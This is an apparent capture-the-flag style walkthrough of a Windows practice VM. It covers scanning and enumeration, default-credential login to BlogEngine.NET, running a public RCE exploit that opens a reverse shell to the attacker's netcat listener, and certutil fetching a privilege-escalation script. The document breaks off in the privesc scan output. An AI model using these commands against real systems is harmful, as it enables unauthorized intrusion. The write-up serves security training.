# 0. Sources

||||
|---|---|---|
|[Reddit](https://www.reddit.com/r/oscp/comments/qsde6o/oscp_like_windows_vm_untroubled_can_you_crack/)|[YouTube](https://www.youtube.com/watch?v=FhXPLXfbPdo)|[Download](https://drive.google.com/file/d/1j2XB-dRoeaSps_rgov4NUiqnTvig58oL/view)|

# 1. nmap scan

```console
┌──(kali㉿kali)-[~]
└─$ nmap -p- -A 10.0.88.48
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-26 07:50 +08
Nmap scan report for 10.0.88.48
Host is up (0.049s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x 1 ftp ftp              0 Sep 14  2021 AccountPictures
| drwxr-xr-x 1 ftp ftp              0 Oct 01  2021 Desktop
| -r--r--r-- 1 ftp ftp            174 Jul 16  2016 desktop.ini
| drwxr-xr-x 1 ftp ftp              0 Sep 14  2021 Documents
| drwxr-xr-x 1 ftp ftp              0 Jul 16  2016 Downloads
| drwxr-xr-x 1 ftp ftp              0 Oct 01  2021 FTP
| drwxr-xr-x 1 ftp ftp              0 Jul 16  2016 Libraries
| drwxr-xr-x 1 ftp ftp              0 Jul 16  2016 Music
| drwxr-xr-x 1 ftp ftp              0 Jul 16  2016 Pictures
|_drwxr-xr-x 1 ftp ftp              0 Jul 16  2016 Videos
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 10 Pro 14393 microsoft-ds (workgroup: ITSL)
2390/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: PRINTPRESS
|   NetBIOS_Domain_Name: PRINTPRESS
|   NetBIOS_Computer_Name: PRINTPRESS
|   DNS_Domain_Name: PrintPress
┌──(root㉿kali)-[~]
└─# nmap -p- -A 10.0.88.33
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-04 07:47 +08
Nmap scan report for 10.0.88.33
Host is up (0.0021s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x 1 ftp ftp              0 Sep 14  2021 AccountPictures
| drwxr-xr-x 1 ftp ftp              0 Oct 01  2021 Desktop
| -r--r--r-- 1 ftp ftp            174 Jul 16  2016 desktop.ini
| drwxr-xr-x 1 ftp ftp              0 Sep 14  2021 Documents
| drwxr-xr-x 1 ftp ftp              0 Jul 16  2016 Downloads
| drwxr-xr-x 1 ftp ftp              0 Oct 01  2021 FTP
| drwxr-xr-x 1 ftp ftp              0 Jul 16  2016 Libraries
| drwxr-xr-x 1 ftp ftp              0 Jul 16  2016 Music
| drwxr-xr-x 1 ftp ftp              0 Jul 16  2016 Pictures
|_drwxr-xr-x 1 ftp ftp              0 Jul 16  2016 Videos
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 10 Pro 14393 microsoft-ds (workgroup: ITSL)
2390/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: PRINTPRESS
|   NetBIOS_Domain_Name: PRINTPRESS
|   NetBIOS_Computer_Name: PRINTPRESS
|   DNS_Domain_Name: PrintPress
|   DNS_Computer_Name: PrintPress
|   Product_Version: 10.0.14393
|_  System_Time: 2022-12-03T23:49:12+00:00
|_ssl-date: 2022-12-03T23:49:20+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=PrintPress
| Not valid before: 2022-12-02T23:45:05
|_Not valid after:  2023-06-03T23:45:05
8021/tcp  open  ftp-proxy?
| fingerprint-strings:
|   NULL:
|     Content-Type: text/rude-rejection
|     Content-Length: 24
|     Access Denied, go away.
|     Content-Type: text/disconnect-notice
|     Content-Length: 67
|     Disconnected, goodbye.
|_    ClueCon! http://www.cluecon.com/
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
⋮
```

# 2. Checking for exploits

## 2.1. Trying the ftp service

The ftp service allows anonymous login, but it doesn't have any useful information

```console
┌──(root㉿kali)-[~]
└─# lftp ftp://anonymous:anonymous@10.0.88.33 -e "find;quit"
./
./AccountPictures/
./AccountPictures/desktop.ini
./Desktop/
./Desktop/Google Chrome.lnk
./Desktop/desktop.ini
./Documents/
./Documents/My Music/
./Documents/My Pictures/
./Documents/My Videos/
./Documents/desktop.ini
./Downloads/
./Downloads/desktop.ini
./FTP/
./Libraries/
./Libraries/RecordedTV.library-ms
./Libraries/desktop.ini
./Music/
./Music/desktop.ini
./Pictures/
./Pictures/desktop.ini
./Videos/
./Videos/desktop.ini
./desktop.ini
```

## 2.2. Trying the HTTP service on port 2390

Port `2390` returned HTTP data, and it appears to be Microsoft IIS default page

![image](https://user-images.githubusercontent.com/90442032/205467375-b3ba5f9c-c6a1-4863-91c1-09d40e8fc4d4.png)

Let's try to enumerate this endpoint to see if we can discover pages under it

☝️ It is unlikely to have an empty web server sitting around, **always try to enumerate web server pages**

```console
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://10.0.88.33:2390 -w /usr/share/seclists/Discovery/Web-Content/combined_words.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.88.33:2390
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/combined_words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/12/04 07:51:39 Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 160] [--> http://10.0.88.33:2390/aspnet_client/]
/.                    (Status: 200) [Size: 696]
/Aspnet_client        (Status: 301) [Size: 160] [--> http://10.0.88.33:2390/Aspnet_client/]
/aspnet_Client        (Status: 301) [Size: 160] [--> http://10.0.88.33:2390/aspnet_Client/]
/ASPNET_CLIENT        (Status: 301) [Size: 160] [--> http://10.0.88.33:2390/ASPNET_CLIENT/]
/blogengine           (Status: 301) [Size: 157] [--> http://10.0.88.33:2390/blogengine/]
/BlogEngine           (Status: 301) [Size: 157] [--> http://10.0.88.33:2390/BlogEngine/]
/Aspnet_Client        (Status: 301) [Size: 160] [--> http://10.0.88.33:2390/Aspnet_Client/]
Progress: 128174 / 128338 (99.87%)===============================================================
2022/12/04 07:51:52 Finished
===============================================================
```

We found BlogEngine on the web server:

![image](https://user-images.githubusercontent.com/90442032/205467486-3f3b1dab-dfb9-4e2a-bd2d-5c57fad9f9c3.png)

Googling for BlogEngine default login show admin/admin as the login

☝️ **Always check for default login**, it may not work most of the time in real life, but it saves a lot of time when it actually does

There doesn't seem to be much to do despite getting administrator login to BlogEngine, let's search for exploits:

```console
┌──(root㉿kali)-[~]
└─# searchsploit blogengine
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
BlogEngine 3.3 - 'syndication.axd' XML External Entity Injection                           | xml/webapps/48422.txt
BlogEngine 3.3 - XML External Entity Injection                                             | windows/webapps/46106.txt
BlogEngine 3.3.8 - 'Content' Stored XSS                                                    | aspx/webapps/48999.txt
BlogEngine.NET 1.4 - 'search.aspx' Cross-Site Scripting                                    | asp/webapps/32874.txt
BlogEngine.NET 1.6 - Directory Traversal / Information Disclosure                          | asp/webapps/35168.txt
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                         | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution         | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                                    | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution    | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                 | aspx/webapps/47014.py
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Exploits `46353`, `47010` and `47011` are RCEs
- `46353` doesn't seem to work, the ascx file didn't run after uploading it
- `47010` and `47011` are similar exploits by the same author, let's try `47010`

# 3. Getting a Shell

Reading the exploit description, this exploit does not just provide a web shell for RCE, it connects back to the attacker listener for a reverse shell

The exploit is a python script configured to use 127.0.0.1:8080 as proxy (likely using burp suite)

If there are no proxy used in the attack, edit/remove the following:

```console
⋮
    proxies = {
            "http": "127.0.0.1:8080",
            "https": "127.0.0.1:8080"
              }
⋮
    resp = session.send(prep, verify=False, proxies=proxies)
⋮
```

Open another console window on Kali to listen for connections:

```console
┌──(root㉿kali)-[~]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
```

Run the exploit:

```console
python3 47010.py -t 10.0.88.33:2390/BlogEngine -u admin -p admin -l kali.vx:4444
```

Verify that the reverse shell has hooked on from the listener console:

```cmd
connect to [192.168.17.10] from (UNKNOWN) [10.0.88.33] 49794
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
whoami /all
c:\windows\system32\inetsrv>whoami /all
USER INFORMATION
----------------
User Name                  SID
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
GROUP INFORMATION
-----------------
Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

Excellent, we now have shell on the target

# 4. Privilege escalation

## 4.1. Finding points of privilege escalation

Scan for possible points of privilege escalation using [PrivescCheck](https://github.com/itm4n/PrivescCheck)

```cmd
certutil.exe -urlcache -f -split https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1 %TEMP%\PrivescCheck.ps1
c:\windows\system32\inetsrv>certutil.exe -urlcache -f -split https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1 %TEMP%\PrivescCheck.ps1
****  Online  ****
  000000  ...
  01444c
CertUtil: -URLCache command completed successfully.
⋮
+------+------------------------------------------------+------+
| TEST | SERVICES > Binary Permissions                  | VULN |
+------+------------------------------------------------+------+
| DESC | List all services and check whether the current user  |
|      | can modify the target executable or write files in    |
|      | its parent folder.                                    |
+------+-------------------------------------------------------+
[*] Found 2 result(s).
Name              : FileZilla Server
ImagePath         : "C:\xampp\filezillaftp\filezillaserver.exe"
User              : LocalSystem
ModifiablePath    : C:\xampp\filezillaftp
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : Delete, WriteAttributes, Synchronize, ReadControl, ListDirectory, AddSubdirectory,
                    WriteExtendedAttributes, ReadAttributes, AddFile, ReadExtendedAttributes, Traverse
Status            : Running
UserCanStart      : False
UserCanStop       : False
Name              : FileZilla Server
ImagePath         : "C:\xampp\filezillaftp\filezillaserver.exe"
User              : LocalSystem
ModifiablePath    : C:\xampp\filezillaftp\filezillaserver.exe
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : Delete, WriteAttributes, Synchronize, ReadControl, ReadData, AppendData, WriteExtendedAttributes,
                    ReadAttributes, WriteData, ReadExtendedAttributes, Execute
Status            : Running
UserCanStart      : False
UserCanStop       : False
⋮
```
